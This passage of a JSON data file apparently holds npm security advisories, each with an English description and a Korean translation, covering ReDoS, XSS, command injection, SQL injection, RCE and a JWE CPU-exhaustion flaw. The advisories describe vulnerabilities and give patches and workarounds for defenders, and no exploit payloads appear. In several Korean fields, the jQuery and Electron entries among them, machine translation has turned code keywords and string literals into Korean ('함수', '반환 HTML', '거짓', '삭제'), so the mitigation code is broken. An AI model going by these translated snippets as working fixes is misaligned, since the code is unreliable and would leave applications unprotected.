    "descriptionKR": "Angular 패키지의 모든 버전은 안전하지 않은 정규식 사용으로 인해 $resource 서비스를 통한 정규식 서비스 거부(ReDoS)에 취약합니다. 신중하게 제작된 입력을 통해 이 취약성을 악용할 수 있으며, 이로 인해 치명적인 역추적이 발생할 수 있습니다."
  },
  {
    "description": "All versions of the package angular are vulnerable to Regular Expression Denial of Service (ReDoS) via the <input type=\"url\"> element due to the usage of an insecure regular expression in the input[url] functionality. Exploiting this vulnerability is possible by a large carefully-crafted input, which can result in catastrophic backtracking. ",
    "identifiers": "GHSA : GHSA-qwqh-hm9m-p5hr\nCVE : CVE-2023-26118",
    "severity": "MODERATE",
    "updatedAt": "2023-05-22T21:31:05Z",
    "publishedAt": "2023-03-30T06:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26118\nhttps://security.snyk.io/vuln/SNYK-JS-ANGULAR-3373046\nhttps://stackblitz.com/edit/angularjs-vulnerability-inpur-url-validation-redos\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-5406326\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBANGULAR-5406328\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5406327\nhttps://github.com/advisories/GHSA-qwqh-hm9m-p5hr",
    "name": "angular",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.8.3",
    "descriptionKR": "모든 버전의 angular 패키지는 input[url] 기능에서 안전하지 않은 정규식을 사용하기 때문에 <input type=\"url\"> 요소를 통한 정규식 서비스 거부(ReDoS)에 취약합니다. 신중하게 제작된 입력을 통해 이 취약성을 악용할 수 있으며, 이로 인해 치명적인 역추적이 발생할 수 있습니다."
  },
  {
    "description": "### Impact\nThe `trainBatch` function has a command injection vulnerability. Clients of the Limdu library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.\n\n### Patches\nPatched in version 0.9.5.\n\n### Workarounds\nDo not use trainBatch with classifiers that rely on shell execution, such as SVM Perf, SVM Linear or Adaboost\n\n### References\nNo",
    "identifiers": "GHSA : GHSA-77qv-gh6f-pgh4\nCVE : CVE-2020-4066",
    "severity": "LOW",
    "updatedAt": "2023-03-31T18:27:08Z",
    "publishedAt": "2020-06-22T15:24:06Z",
    "references": "https://github.com/erelsgl/limdu/security/advisories/GHSA-77qv-gh6f-pgh4\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-4066\nhttps://github.com/erelsgl/limdu/commit/03475a6a6bb253de6fad8f7f39cfb3504f11438d\nhttps://github.com/advisories/GHSA-77qv-gh6f-pgh4",
    "name": "limdu",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.9.4",
    "identifier": "0.9.5",
    "descriptionKR": "### 영향\n'trainBatch' 함수에는 명령 주입 취약점이 있습니다. Limdu 라이브러리의 클라이언트는 이를 인지하지 못할 가능성이 높으므로 무의식적으로 취약점이 포함된 코드를 작성할 수 있습니다.\n\n### 패치\n0.9.5 버전에서 패치되었습니다.\n\n### 해결 방법\nSVM Perf, SVM Linear 또는 Adaboost와 같이 셸 실행에 의존하는 분류자와 함께 trainBatch를 사용하지 마십시오.\n\n### 참조\n아니요"
  },
  {
    "description": "A cross-site scripting (XSS) vulnerability in the HTML Data Processor for CKEditor 4.0 before 4.14.0 allows remote attackers to inject arbitrary web script through a crafted \"protected\" comment (with the cke_protected syntax).",
    "identifiers": "GHSA : GHSA-vcjf-mgcg-jxjq\nCVE : CVE-2020-9281",
    "severity": "MODERATE",
    "updatedAt": "2023-03-31T18:24:19Z",
    "publishedAt": "2021-05-07T16:32:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-9281\nhttps://github.com/ckeditor/ckeditor4\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7OJ4BSS3VEAEXPNSOOUAXX6RDNECGZNO/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L322YA73LCV3TO7ORY45WQDAFJVNKXBE/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/M4HHYQ6N452XTCIROFMJOTYEUWSB6FR4/\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://github.com/advisories/GHSA-vcjf-mgcg-jxjq",
    "name": "ckeditor4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.14.0",
    "identifier": "4.14.0",
    "descriptionKR": "4.14.0 이전의 CKEditor 4.0용 HTML 데이터 프로세서의 XSS(교차 사이트 스크립팅) 취약성으로 인해 원격 공격자가 조작된 \"보호된\" 주석(cke_protected 구문 사용)을 통해 임의의 웹 스크립트를 삽입할 수 있습니다."
  },
  {
    "description": "Feather-Sequelize cleanQuery method uses insecure recursive logic to filter unsupported keys from the query object. This results in a Remote Code Execution (RCE) with privileges of application.",
    "identifiers": "GHSA : GHSA-p5m3-27vh-52j4\nCVE : CVE-2022-29823",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-31T18:23:08Z",
    "publishedAt": "2022-10-26T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-29823\nhttps://csirt.divd.nl/cases/DIVD-2022-00020\nhttps://csirt.divd.nl/cves/CVE-2022-29823/\nhttps://github.com/feathersjs-ecosystem/feathers-sequelize/commit/0b7beaa773dc313fdb27edd9ee8115064d7cf114\nhttps://csirt.divd.nl/CVE-2022-29823/\nhttps://csirt.divd.nl/DIVD-2022-00020\nhttps://github.com/advisories/GHSA-p5m3-27vh-52j4",
    "name": "feathers-sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.3.3",
    "identifier": "6.3.3",
    "descriptionKR": "Feather-Sequelize cleanQuery 메서드는 안전하지 않은 재귀 논리를 사용하여 쿼리 개체에서 지원되지 않는 키를 필터링합니다. 그 결과 응용 프로그램 권한이 있는 원격 코드 실행(RCE)이 발생합니다."
  },
  {
    "description": "Due to improper input validation in the Feathers js library, it is possible to perform a SQL injection attack on the back-end database, in case the feathers-sequelize package is used.",
    "identifiers": "GHSA : GHSA-qpv8-4pjq-qqh7\nCVE : CVE-2022-2422",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-31T18:22:37Z",
    "publishedAt": "2022-10-26T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2422\nhttps://csirt.divd.nl/cases/DIVD-2022-00020\nhttps://csirt.divd.nl/cves/CVE-2022-2422\nhttps://github.com/feathersjs-ecosystem/feathers-sequelize/commit/0f2d85f0b2d556f2b6c70423dcebdbd29d95e3dc\nhttps://csirt.divd.nl/CVE-2022-2422\nhttps://csirt.divd.nl/DIVD-2022-00020\nhttps://github.com/advisories/GHSA-qpv8-4pjq-qqh7",
    "name": "feathers-sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.3.4",
    "identifier": "6.3.4",
    "descriptionKR": "Feathers js 라이브러리의 잘못된 입력 유효성 검사로 인해 feathers-sequelize 패키지를 사용하는 경우 백엔드 데이터베이스에 SQL 주입 공격을 수행할 수 있습니다."
  },
  {
    "description": "### Impact\nPassing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\n\n### Patches\nThis problem is patched in jQuery 3.5.0.\n\n### Workarounds\nTo workaround the issue without upgrading, adding the following to your code:\n\n```js\njQuery.htmlPrefilter = function( html ) {\n\treturn html;\n};\n```\n\nYou need to use at least jQuery 1.12/2.2 or newer to be able to apply this workaround.\n\n### References\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://jquery.com/upgrade-guide/3.5/\n\n### For more information\nIf you have any questions or comments about this advisory, search for a relevant issue in [the jQuery repo](https://github.com/jquery/jquery/issues). If you don't find an answer, open a new issue.",
    "identifiers": "GHSA : GHSA-gxr4-xjj5-5px2\nCVE : CVE-2020-11022",
    "severity": "MODERATE",
    "updatedAt": "2023-03-31T18:22:12Z",
    "publishedAt": "2020-04-29T22:18:55Z",
    "references": "https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2\nhttps://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://jquery.com/upgrade-guide/3.5/\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-11022\nhttps://security.netapp.com/advisory/ntap-20200511-0006/\nhttps://www.drupal.org/sa-core-2020-002\nhttps://www.debian.org/security/2020/dsa-4693\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VOE7P7APPRQKD4FGNHBKJPDY6FFCOH3W/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QPN2L2XVQGUA2V5HNQJWHK3APSK3VN7K/\nhttps://www.oracle.com/security-alerts/cpujul2020.html\nhttp://lists.opensuse.org/opensuse-security-announce/2020-07/msg00067.html\nhttps://security.gentoo.org/glsa/202007-03\nhttp://lists.opensuse.org/opensuse-security-announce/2020-07/msg00085.html\nhttps://lists.apache.org/thread.html/rdf44341677cf7eec7e9aa96dcf3f37ed709544863d619cca8c36f133@%3Ccommits.airflow.apache.org%3E\nhttps://github.com/advisories/GHSA-gxr4-xjj5-5px2\nhttps://www.npmjs.com/advisories/1518\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AVKYXLWCLZBV2N7M46KYK4LVA5OXWPBY/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SFP4UK4EGP4AFH2MWYJ5A5Z4I7XVFQ6B/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SAPQVX3XDNPGFT26QAQ6AJIXZZBZ4CD4/\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://lists.apache.org/thread.html/r706cfbc098420f7113968cc377247ec3d1439bce42e679c11c609e2d@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/rbb448222ba62c430e21e13f940be4cb5cfc373cd3bce56b48c0ffa67@%3Cdev.flink.apache.org%3E\nhttp://lists.opensuse.org/opensuse-security-announce/2020-11/msg00039.html\nhttps://lists.apache.org/thread.html/r49ce4243b4738dd763caeb27fa8ad6afb426ae3e8c011ff00b8b1f48@%3Cissues.flink.apache.org%3E\nhttps://www.tenable.com/security/tns-2020-10\nhttps://www.tenable.com/security/tns-2020-11\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://lists.apache.org/thread.html/r564585d97bc069137e64f521e68ba490c7c9c5b342df5d73c49a0760@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/r8f70b0f65d6bedf316ecd899371fd89e65333bc988f6326d2956735c@%3Cissues.flink.apache.org%3E\nhttps://www.tenable.com/security/tns-2021-02\nhttps://lists.debian.org/debian-lts-announce/2021/03/msg00033.html\nhttp://packetstormsecurity.com/files/162159/jQuery-1.2-Cross-Site-Scripting.html\nhttps://lists.apache.org/thread.html/rede9cfaa756e050a3d83045008f84a62802fc68c17f2b4eabeaae5e4@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/ree3bd8ddb23df5fa4e372d11c226830ea3650056b1059f3965b3fce2@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/r54565a8f025c7c4f305355fdfd75b68eca442eebdb5f31c2e7d977ae@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/re4ae96fa5c1a2fe71ccbb7b7ac1538bd0cb677be270a2bf6e2f8d108@%3Cissues.flink.apache.org%3E\nhttps://www.tenable.com/security/tns-2021-10\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://lists.apache.org/thread.html/r0483ba0072783c2e1bfea613984bfb3c86e73ba8879d780dc1cc7d36@%3Cissues.flink.apache.org%3E\nhttps://github.com/jquery/jquery/releases/tag/3.5.0\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpuapr2022.html\nhttps://www.oracle.com/security-alerts/cpujul2022.html",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.2.0, < 3.5.0",
    "identifier": "3.5.0",
    "descriptionKR": "### 영향\n신뢰할 수 없는 소스의 HTML을 제거한 후에도 jQuery의 DOM 조작 메서드(예: `.html()`, `.append()` 및 기타) 중 하나로 HTML을 전달하면 신뢰할 수 없는 코드가 실행될 수 있습니다.\n\n### 패치\n이 문제는 jQuery 3.5.0에서 패치되었습니다.\n\n### 해결 방법\n업그레이드하지 않고 문제를 해결하려면 코드에 다음을 추가하십시오.\n\n```js\njQuery.htmlPrefilter = 함수( html ) {\n반환 HTML;\n};\n```\n\n이 해결 방법을 적용하려면 최소한 jQuery 1.12/2.2 이상을 사용해야 합니다.\n\n### 참조\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://jquery.com/upgrade-guide/3.5/\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 [jQuery 리포지토리](https://github.com/jquery/jquery/issues)에서 관련 문제를 검색하세요. 답변을 찾지 못한 경우 새 문제를 엽니다."
  },
  {
    "description": "Versions of electron \nA vulnerability has been discovered which allows Node.js integration to be re-enabled in some Electron applications that disable it.\n\nFor the application to be impacted by this vulnerability it must meet all of these conditions\n\n- Runs on Electron 1.7, 1.8, or a 2.0.0-beta\n- Allows execution of arbitrary remote code\n- Disables Node.js integration\n- Does not explicitly declare webviewTag: false in its webPreferences\n- Does not enable the nativeWindowOption option\n- Does not intercept new-window events and manually override event.newGuest without using the supplied options tag\n\n\n## Recommendation\n\nUpdate to `electron` version 1.7.13, 1.8.4, or 2.0.0-beta.5 or later.\n\nIf you are unable to update your Electron version can mitigate the vulnerability with the following code.\n\n```\napp.on('web-contents-created', (event, win) => {\n  win.on('new-window', (event, newURL, frameName, disposition,\n                        options, additionalFeatures) => {\n    if (!options.webPreferences) options.webPreferences = {};\n    options.webPreferences.nodeIntegration = false;\n    options.webPreferences.nodeIntegrationInWorker = false;\n    options.webPreferences.webviewTag = false;\n    delete options.webPreferences.preload;\n  })\n})\n\n// and *IF* you don't use WebViews at all,\n// you might also want\napp.on('web-contents-created', (event, win) => {\n  win.on('will-attach-webview', (event, webPreferences, params) => {\n    event.preventDefault();\n  })\n})\n```",
    "identifiers": "GHSA : GHSA-8xwg-wv7v-4vqp\nCVE : CVE-2018-1000136",
    "severity": "HIGH",
    "updatedAt": "2023-03-31T18:21:31Z",
    "publishedAt": "2018-03-26T16:41:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000136\nhttps://electronjs.org/blog/webview-fix\nhttps://www.npmjs.com/advisories/574\nhttps://www.electronjs.org/blog/webview-fix\nhttps://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2018-1000136---Electron-nodeIntegration-Bypass/\nhttps://github.com/electron/electron/pull/12271\nhttps://github.com/electron/electron/pull/12292\nhttps://github.com/electron/electron/pull/12294\nhttps://github.com/electron/electron/commit/1a48ee28276e6588dbf4e70e58d78e7bfdc57043\nhttps://github.com/advisories/GHSA-8xwg-wv7v-4vqp",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.8.0, < 1.8.4",
    "identifier": "1.8.4",
    "descriptionKR": "전자 버전\nNode.js 통합을 비활성화한 일부 Electron 애플리케이션에서 다시 활성화할 수 있는 취약점이 발견되었습니다.\n\n응용 프로그램이 이 취약점의 영향을 받으려면 다음 조건을 모두 충족해야 합니다.\n\n- Electron 1.7, 1.8 또는 2.0.0-베타에서 실행\n- 임의의 원격 코드 실행 허용\n- Node.js 통합 비활성화\n- 명시적으로 webviewTag를 선언하지 않음: webPreferences에서 false\n- nativeWindowOption 옵션을 활성화하지 않습니다.\n- 새 창 이벤트를 가로채지 않고 제공된 옵션 태그를 사용하지 않고 수동으로 event.newGuest를 재정의합니다.\n\n\n## 추천\n\n`electron` 버전 1.7.13, 1.8.4 또는 2.0.0-beta.5 이상으로 업데이트하십시오.\n\nElectron 버전을 업데이트할 수 없는 경우 다음 코드를 사용하여 취약점을 완화할 수 있습니다.\n\n```\napp.on('웹 콘텐츠 생성', (이벤트, 당첨) => {\n  win.on('새 창', (이벤트, 새 URL, 프레임 이름, 배치,\n                        옵션, 추가 기능) => {\n    if (!options.webPreferences) options.webPreferences = {};\n    options.webPreferences.nodeIntegration = 거짓;\n    options.webPreferences.nodeIntegrationInWorker = 거짓;\n    options.webPreferences.webviewTag = 거짓;\n    삭제 options.webPreferences.preload;\n  })\n})\n\n// *IF* WebView를 전혀 사용하지 않는 경우,\n// 원할 수도 있습니다.\napp.on('웹 콘텐츠 생성', (이벤트, 당첨) => {\n  win.on('will-attach-webview', (event, webPreferences, params) => {\n    event.preventDefault();\n  })\n})\n```"
  },
  {
    "description": "Versions of electron \nA vulnerability has been discovered which allows Node.js integration to be re-enabled in some Electron applications that disable it.\n\nFor the application to be impacted by this vulnerability it must meet all of these conditions\n\n- Runs on Electron 1.7, 1.8, or a 2.0.0-beta\n- Allows execution of arbitrary remote code\n- Disables Node.js integration\n- Does not explicitly declare webviewTag: false in its webPreferences\n- Does not enable the nativeWindowOption option\n- Does not intercept new-window events and manually override event.newGuest without using the supplied options tag\n\n\n## Recommendation\n\nUpdate to `electron` version 1.7.13, 1.8.4, or 2.0.0-beta.5 or later.\n\nIf you are unable to update your Electron version can mitigate the vulnerability with the following code.\n\n```\napp.on('web-contents-created', (event, win) => {\n  win.on('new-window', (event, newURL, frameName, disposition,\n                        options, additionalFeatures) => {\n    if (!options.webPreferences) options.webPreferences = {};\n    options.webPreferences.nodeIntegration = false;\n    options.webPreferences.nodeIntegrationInWorker = false;\n    options.webPreferences.webviewTag = false;\n    delete options.webPreferences.preload;\n  })\n})\n\n// and *IF* you don't use WebViews at all,\n// you might also want\napp.on('web-contents-created', (event, win) => {\n  win.on('will-attach-webview', (event, webPreferences, params) => {\n    event.preventDefault();\n  })\n})\n```",
    "identifiers": "GHSA : GHSA-8xwg-wv7v-4vqp\nCVE : CVE-2018-1000136",
    "severity": "HIGH",
    "updatedAt": "2023-03-31T18:21:31Z",
    "publishedAt": "2018-03-26T16:41:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000136\nhttps://electronjs.org/blog/webview-fix\nhttps://www.npmjs.com/advisories/574\nhttps://www.electronjs.org/blog/webview-fix\nhttps://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2018-1000136---Electron-nodeIntegration-Bypass/\nhttps://github.com/electron/electron/pull/12271\nhttps://github.com/electron/electron/pull/12292\nhttps://github.com/electron/electron/pull/12294\nhttps://github.com/electron/electron/commit/1a48ee28276e6588dbf4e70e58d78e7bfdc57043\nhttps://github.com/advisories/GHSA-8xwg-wv7v-4vqp",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.7.0, < 1.7.13",
    "identifier": "1.7.13",
    "descriptionKR": "전자 버전\nNode.js 통합을 비활성화한 일부 Electron 애플리케이션에서 다시 활성화할 수 있는 취약점이 발견되었습니다.\n\n응용 프로그램이 이 취약점의 영향을 받으려면 다음 조건을 모두 충족해야 합니다.\n\n- Electron 1.7, 1.8 또는 2.0.0-베타에서 실행\n- 임의의 원격 코드 실행 허용\n- Node.js 통합 비활성화\n- 명시적으로 webviewTag를 선언하지 않음: webPreferences에서 false\n- nativeWindowOption 옵션을 활성화하지 않습니다.\n- 새 창 이벤트를 가로채지 않고 제공된 옵션 태그를 사용하지 않고 수동으로 event.newGuest를 재정의합니다.\n\n\n## 추천\n\n`electron` 버전 1.7.13, 1.8.4 또는 2.0.0-beta.5 이상으로 업데이트하십시오.\n\nElectron 버전을 업데이트할 수 없는 경우 다음 코드를 사용하여 취약점을 완화할 수 있습니다.\n\n```\napp.on('웹 콘텐츠 생성', (이벤트, 당첨) => {\n  win.on('새 창', (이벤트, 새 URL, 프레임 이름, 배치,\n                        옵션, 추가 기능) => {\n    if (!options.webPreferences) options.webPreferences = {};\n    options.webPreferences.nodeIntegration = 거짓;\n    options.webPreferences.nodeIntegrationInWorker = 거짓;\n    options.webPreferences.webviewTag = 거짓;\n    삭제 options.webPreferences.preload;\n  })\n})\n\n// *IF* WebView를 전혀 사용하지 않는 경우,\n// 원할 수도 있습니다.\napp.on('웹 콘텐츠 생성', (이벤트, 당첨) => {\n  win.on('will-attach-webview', (event, webPreferences, params) => {\n    event.preventDefault();\n  })\n})\n```"
  },
  {
    "description": "In Bootstrap 4.x before 4.1.2, XSS is possible in the collapse data-parent attribute.",
    "identifiers": "GHSA : GHSA-3wqf-4x89-9g79\nCVE : CVE-2018-14040",
    "severity": "MODERATE",
    "updatedAt": "2023-05-22T18:22:17Z",
    "publishedAt": "2022-05-13T01:07:54Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-14040\nhttps://github.com/twbs/bootstrap/issues/26423\nhttps://github.com/twbs/bootstrap/issues/26625\nhttps://github.com/twbs/bootstrap/pull/26630\nhttps://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/52e0e6b5df827ee7f1e68f7cc3babe61af3b2160f5d74a85469b7b0e@%3Cdev.superset.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/r3dc0cac8d856bca02bd6997355d7ff83027dcfc82f8646a29b89b714@%3Cissues.hbase.apache.org%3E\nhttps://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26@%3Ccommits.pulsar.apache.org%3E\nhttps://lists.debian.org/debian-lts-announce/2018/08/msg00027.html\nhttps://seclists.org/bugtraq/2019/May/18\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://www.tenable.com/security/tns-2021-14\nhttp://packetstormsecurity.com/files/152787/dotCMS-5.1.1-Vulnerable-Dependencies.html\nhttp://packetstormsecurity.com/files/156743/OctoberCMS-Insecure-Dependencies.html\nhttp://seclists.org/fulldisclosure/2019/May/10\nhttp://seclists.org/fulldisclosure/2019/May/11\nhttp://seclists.org/fulldisclosure/2019/May/13\nhttps://github.com/twbs/bootstrap/blob/v3.4.1/js/collapse.js#L140\nhttps://github.com/twbs/bootstrap/blob/v3.4.1/js/scrollspy.js#L56\nhttps://github.com/twbs/bootstrap/blob/v3.4.1/js/tooltip.js#L352\nhttps://github.com/twbs/bootstrap-rubygem/commit/f34c43c936ac7d0ebb129289321d8c51cd56aed1#diff-4e736e880b7fc39eb5e85576b629f6e3cd08f02f45104a7b4581f82852e97a81R1306\nhttps://github.com/twbs/bootstrap/commit/149096016f70fd815540d62c0989fd99cdc809e0\nhttps://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2018-14040.yml\nhttps://github.com/advisories/GHSA-3wqf-4x89-9g79",
    "name": "bootstrap",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.1.2",
    "identifier": "4.1.2",
    "descriptionKR": "4.1.2 이전의 Bootstrap 4.x에서는 축소 data-parent 속성에서 XSS가 가능합니다."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose-node-esm-runtime",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, <= 4.9.1",
    "identifier": "4.9.2",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 